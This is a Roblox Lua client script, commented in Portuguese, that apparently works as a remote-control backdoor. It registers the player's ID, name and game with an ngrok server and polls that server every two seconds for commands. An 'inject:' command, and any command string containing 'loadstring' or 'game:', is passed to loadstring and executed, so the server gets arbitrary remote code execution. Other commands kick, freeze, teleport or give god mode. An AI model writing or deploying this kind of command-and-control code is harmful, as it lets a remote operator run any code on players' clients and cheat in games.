local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local localPlayer = Players.LocalPlayer
local userId = tostring(localPlayer.UserId)
local playerName = localPlayer.Name
local jogo = tostring(game.PlaceId)

-- URL do seu servidor Flask no Replit (GRATUITO)
local servidor = "https://witty-basilisk-eminent.ngrok-free.app/"

-- Função que registra o jogador no servidor
local function registrarJogador()
    local data = {
        id = userId,
        nome = playerName,
        jogo = jogo
    }
    local json = HttpService:JSONEncode(data)
    local success, err = pcall(function()
        HttpService:PostAsync(servidor .. "/entrada", json, Enum.HttpContentType.ApplicationJson)
    end)
    if success then
        print("Jogador registrado com sucesso no servidor")
    else
        print("Erro ao registrar: " .. tostring(err))
    end
end

-- Função que pega comandos do servidor
local function pegarComando()
    local success, resposta = pcall(function()
        return HttpService:GetAsync(servidor .. "/comando/" .. userId)
    end)
    
    if success and resposta and resposta ~= "" then
        local ok, cmd = pcall(function()
            return HttpService:JSONDecode(resposta)
        end)
        
        if ok and cmd and cmd.has_command then
            local comando = cmd.command
            local acao = comando.action
            
            print("Comando recebido: " .. acao)
            
            -- Comandos básicos do servidor
            if acao == "stop" then
                if localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid") then
                    localPlayer.Character.Humanoid.WalkSpeed = 0
                    localPlayer.Character.Humanoid.JumpPower = 0
                    print("Personagem parado")
                end
            elseif acao == "start" then
                if localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid") then
                    localPlayer.Character.Humanoid.WalkSpeed = 16
                    localPlayer.Character.Humanoid.JumpPower = 50
                    print("Personagem liberado para movimento")
                end
            elseif acao == "desconectar" then
                localPlayer:Kick("Desconectado pelo servidor de controle")
            elseif acao == "ping" then
                print("Pong! Dispositivo respondendo")
            
            -- Comandos avançados (compatibilidade com código antigo)
            elseif acao == "kick" then
                localPlayer:Kick("Você foi expulso pelo sistema de controle.")
            elseif acao == "freeze" then
                if localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid") then
                    localPlayer.Character.Humanoid.WalkSpeed = 0
                    localPlayer.Character.Humanoid.JumpPower = 0
                    print("Personagem congelado")
                end
            elseif acao == "unfreeze" then
                if localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid") then
                    localPlayer.Character.Humanoid.WalkSpeed = 16
                    localPlayer.Character.Humanoid.JumpPower = 50
                    print("Personagem descongelado")
                end
            elseif acao == "tp_spawn" then
                if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 10, 0)
                    print("Teleportado para spawn")
                end
            elseif acao == "reset" then
                if localPlayer.Character then
                    localPlayer.Character:BreakJoints()
                    print("Personagem resetado")
                end
            elseif acao == "god" then
                if localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid") then
                    localPlayer.Character.Humanoid.MaxHealth = math.huge
                    localPlayer.Character.Humanoid.Health = math.huge
                    print("Modo God ativado")
                end
            elseif acao == "ungod" then
                if localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid") then
                    localPlayer.Character.Humanoid.MaxHealth = 100
                    localPlayer.Character.Humanoid.Health = 100
                    print("Modo God desativado")
                end
            elseif acao:sub(1, 7) == "inject:" then
                -- Comando para executar código Lua personalizado
                local code = acao:sub(8) -- Remove "inject:" do início
                local func = loadstring(code)
                if func then
                    local success, result = pcall(func)
                    if success then
                        print("Código executado com sucesso")
                    else
                        print("Erro ao executar código: " .. tostring(result))
                    end
                else
                    print("Erro: código Lua inválido")
                end
            else
                -- Comando personalizado genérico
                print("Comando personalizado recebido: " .. acao)
                
                -- Você pode adicionar lógica personalizada aqui
                -- Por exemplo, se o comando for um código Lua:
                if acao:find("loadstring") or acao:find("game:") then
                    local func = loadstring(acao)
                    if func then
                        local success, result = pcall(func)
                        if success then
                            print("Comando executado com sucesso")
                        else
                            print("Erro ao executar comando: " .. tostring(result))
                        end
                    end
                end
            end
        end
    end
end

-- Registra 1x assim que o script roda
registrarJogador()

-- Loop infinito que checa comandos a cada 2 segundos
spawn(function()
    while true do
        if localPlayer and localPlayer.Parent then
            pegarComando()
        else
            break -- Sai do loop se o jogador saiu
        end
        task.wait(2)
    end
end)

-- Registra novamente quando o personagem spawna
localPlayer.CharacterAdded:Connect(function(character)
    task.wait(2) -- Espera o personagem carregar completamente
    registrarJogador()
end)

print("Sistema de controle remoto iniciado - ID: " .. userId)
print("Servidor: " .. servidor)
print("Aguardando comandos...")
